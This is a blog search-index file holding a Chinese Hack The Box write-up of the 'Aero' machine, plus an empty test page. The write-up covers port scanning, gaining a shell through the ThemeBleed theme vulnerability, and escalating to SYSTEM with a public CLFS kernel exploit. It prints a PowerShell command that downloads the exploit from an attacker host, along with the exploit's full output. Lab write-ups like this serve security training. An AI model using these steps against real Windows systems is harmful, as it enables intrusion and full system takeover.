<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Aero</title>
    <link href="/2025/01/18/Aero/"/>
    <url>/2025/01/18/Aero/</url>
    
    <content type="html"><![CDATA[<h2 id="Aero"><a href="#Aero" class="headerlink" title="Aero"></a>Aero</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">11</span>.<span class="hljs-number">237</span><br><span class="hljs-attribute">sudo</span> masscan -p1-<span class="hljs-number">65535</span> <span class="hljs-number">10.10.11.237</span> --rate=<span class="hljs-number">1000</span> -e tun0 &gt; ports<br><span class="hljs-attribute">ports</span>=$(cat ports | awk -F <span class="hljs-string">&quot; &quot;</span> &#x27;&#123;print $<span class="hljs-number">4</span>&#125;&#x27; | awk -F <span class="hljs-string">&quot;/&quot;</span> &#x27;&#123;print $<span class="hljs-number">1</span>&#125;&#x27; | sort -n | tr &#x27;\n&#x27; &#x27;,&#x27; | sed &#x27;s/,$//&#x27;)<br><span class="hljs-attribute">nmap</span> -Pn -sV -sC -p$ports <span class="hljs-number">10.10.11.237</span><br><span class="hljs-attribute">nmap</span> <span class="hljs-number">10.10.11.237</span> --script=vuln<br><span class="hljs-attribute">nmap</span> <span class="hljs-number">10.10.11.237</span> -sU --top-ports <span class="hljs-number">20</span> -Pn<br></code></pre></td></tr></table></figure><p><img src="/../imgs/image-20250117205029434.png" alt="image-20250117205029434"></p><h3 id="80服务渗透"><a href="#80服务渗透" class="headerlink" title="80服务渗透"></a>80服务渗透</h3><p><img src="/../imgs/image-20250117213545685.png" alt="image-20250117213545685"></p><p><img src="/../imgs/image-20250117213550616.png" alt="image-20250117213550616"></p><p><img src="/../imgs/image-20250117213619548.png" alt="image-20250117213619548"></p><p>大概率有时恶意软件</p><p>谷歌搜下有一个cve</p><p><a href="https://www.exploit-db.com/exploits/47975">https://www.exploit-db.com/exploits/47975</a></p><p>我虽然生成了，但是貌似没什么用，甚至介绍都没告诉我怎么用的</p><p>好吧，其实漏洞并不产生在此</p><p>是CVE-2023-38146（称为 ThemeBleed）漏洞</p><p>POC公开地址:<a href="https://github.com/exploits-forsale/themebleed/tree/main/SMBFilterDemo">https://github.com/exploits-forsale/themebleed/tree/main/SMBFilterDemo</a></p><p>py版本:<a href="https://github.com/Jnnshschl/CVE-2023-38146/tree/main">https://github.com/Jnnshschl/CVE-2023-38146/tree/main</a></p><p>介绍:<a href="https://socprime.com/blog/cve-2023-38146-detection-windows-themebleed-rce-bugposes-growing-risks-with-the-poc-exploit-release/">https://socprime.com/blog/cve-2023-38146-detection-windows-themebleed-rce-bugposes-growing-risks-with-the-poc-exploit-release/</a></p><p>首先我们下载项目，然后在win下生成恶意dll</p><p><img src="/../imgs/image-20250118170123123.png" alt="image-20250118170123123"></p><p>然后拿到kali去，</p><p><img src="/../imgs/image-20250118170153430.png" alt="image-20250118170153430"></p><p>运行项目，生成的theme主题文件上传web</p><p><img src="/../imgs/image-20250118170223560.png" alt="image-20250118170223560"></p><p>本地监听9001</p><p><img src="/../imgs/image-20250118170232089.png" alt="image-20250118170232089"></p><p>成功</p><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p><img src="/../imgs/image-20250118170449047.png" alt="image-20250118170449047"></p><p>拿下pdf来看</p><figure class="highlight clojure"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clojure">[convert]<span class="hljs-symbol">::ToBase64String</span>((<span class="hljs-name">cat</span> CVE-2023-28252_Summary.pdf -Encoding byte)) <br></code></pre></td></tr></table></figure><p><img src="/../imgs/image-20250118171438267.png" alt="image-20250118171438267"></p><p>我们看系统配置</p><p><img src="/../imgs/image-20250118172255188.png" alt="image-20250118172255188"></p><p>看下面的补丁</p><p><img src="/../imgs/image-20250118172308191.png" alt="image-20250118172308191"></p><p>然后上官网看这个漏洞的补丁编码</p><p><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-28252">https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-28252</a></p><p><img src="/../imgs/image-20250118172331345.png" alt="image-20250118172331345"></p><p>确认没打补丁，寻找exp进攻</p><p>漏洞介绍</p><p><a href="https://github.com/fortra/CVE-2023-28252">https://github.com/fortra/CVE-2023-28252</a></p><p>利用exe</p><p><a href="https://github.com/bkstephen/Compiled-PoC-Binary-For-CVE-2023-28252/blob/main/x64/Release/clfs_eop.exe">https://github.com/bkstephen/Compiled-PoC-Binary-For-CVE-2023-28252/blob/main/x64/Release/clfs_eop.exe</a></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs stylus">PS C:\programdata&gt; iwr http:<span class="hljs-comment">//10.10.16.39/clfs_eop.exe -o cff.exe</span><br>iwr http:<span class="hljs-comment">//10.10.16.39/clfs_eop.exe -o cff.exe</span><br>PS C:\programdata&gt; .\cff<span class="hljs-selector-class">.exe</span> whoami<br>.\cff<span class="hljs-selector-class">.exe</span> whoami<br><span class="hljs-selector-attr">[+]</span> Incorrect number of arguments ... using default value <span class="hljs-number">1208</span> and flag <span class="hljs-number">1</span> <span class="hljs-keyword">for</span> w11 and w10<br><br><br>ARGUMENTS<br><span class="hljs-selector-attr">[+]</span> TOKEN OFFSET <span class="hljs-number">4</span>b8<br><span class="hljs-selector-attr">[+]</span> FLAG <span class="hljs-number">1</span><br><br><br>VIRTUAL ADDRESSES AND OFFSETS<br><span class="hljs-selector-attr">[+]</span> NtFsControlFile Address --&gt; <span class="hljs-number">00007</span>FFBD0DE4240<br><span class="hljs-selector-attr">[+]</span> pool NpAt VirtualAddress --&gt;FFFFD68AFEF56000<br><span class="hljs-selector-attr">[+]</span> MY EPROCESSS FFFF8D8C8E7C2140<br><span class="hljs-selector-attr">[+]</span> SYSTEM EPROCESSS FFFF8D8C8A8CF040<br><span class="hljs-selector-attr">[+]</span> _ETHREAD ADDRESS FFFF8D8C8E4D2080<br><span class="hljs-selector-attr">[+]</span> PREVIOUS MODE ADDRESS FFFF8D8C8E4D22B2<br><span class="hljs-selector-attr">[+]</span> Offset ClfsEarlierLsn --------------------------&gt; <span class="hljs-number">0000000000013220</span><br><span class="hljs-selector-attr">[+]</span> Offset ClfsMgmtDeregisterManagedClient --------------------------&gt; <span class="hljs-number">000000000002</span>BFB0<br><span class="hljs-selector-attr">[+]</span> Kernel ClfsEarlierLsn --------------------------&gt; FFFFF80201333220<br><span class="hljs-selector-attr">[+]</span> Kernel ClfsMgmtDeregisterManagedClient --------------------------&gt; FFFFF8020134BFB0<br><span class="hljs-selector-attr">[+]</span> Offset RtlClearBit --------------------------&gt; <span class="hljs-number">0000000000343010</span><br><span class="hljs-selector-attr">[+]</span> Offset PoFxProcessorNotification --------------------------&gt; <span class="hljs-number">00000000003</span>DBD00<br><span class="hljs-selector-attr">[+]</span> Offset SeSetAccessStateGenericMapping --------------------------&gt; <span class="hljs-number">00000000009</span>C87B0<br><span class="hljs-selector-attr">[+]</span> Kernel RtlClearBit --------------------------&gt; FFFFF80203B43010<br><span class="hljs-selector-attr">[+]</span> Kernel SeSetAccessStateGenericMapping --------------------------&gt; FFFFF802041C87B0<br><br><span class="hljs-selector-attr">[+]</span> Kernel PoFxProcessorNotification --------------------------&gt; FFFFF80203BDBD00<br><br><br>PATHS<br><span class="hljs-selector-attr">[+]</span> Folder Public Path = C:\Users\Public<br><span class="hljs-selector-attr">[+]</span> Base log file name path= LOG:C:\Users\Public\<span class="hljs-number">49</span><br><span class="hljs-selector-attr">[+]</span> Base file <span class="hljs-selector-tag">path</span> = C:\Users\Public\<span class="hljs-number">49</span><span class="hljs-selector-class">.blf</span><br><span class="hljs-selector-attr">[+]</span> Container file name <span class="hljs-selector-tag">path</span> = C:\Users\Public\<span class="hljs-selector-class">.p_49</span><br>Last kernel CLFS <span class="hljs-selector-tag">address</span> = FFFFD68AEFCAF000<br>numero de tags CLFS founded <span class="hljs-number">9</span><br><br>Last kernel CLFS <span class="hljs-selector-tag">address</span> = FFFFD68AF4125000<br>numero de tags CLFS founded <span class="hljs-number">1</span><br><br><span class="hljs-selector-attr">[+]</span> Log file handle: <span class="hljs-number">0000000000000104</span><br><span class="hljs-selector-attr">[+]</span> Pool CLFS kernel <span class="hljs-selector-tag">address</span>: FFFFD68AF4125000<br><br>number of pipes created =<span class="hljs-number">5000</span><br><br>number of pipes created =<span class="hljs-number">4000</span><br>TRIGGER START<br>System_token_value: FFFFD68AEBA41597<br>SYSTEM TOKEN CAPTURED<br>Closing Handle<br>ACTUAL USER=SYSTEM<br>nt authority\system<br>WE ARE SYSTEM<br>PS C:\programdata&gt; <br></code></pre></td></tr></table></figure><p>可以看到是nt authority\system权限，成功提权</p>]]></content>
    
    
    <categories>
      
      <category>HTB</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>testPage</title>
    <link href="/2025/01/17/testPage/"/>
    <url>/2025/01/17/testPage/</url>
    
    <content type="html"><![CDATA[<p>test页面</p><p><img src="/../imgs/image-20241010013554389.png" alt="image-20241010013554389"></p>]]></content>
    
    
    <categories>
      
      <category>hexo</category>
      
    </categories>
    
    
  </entry>
  
  
  
  
</search>
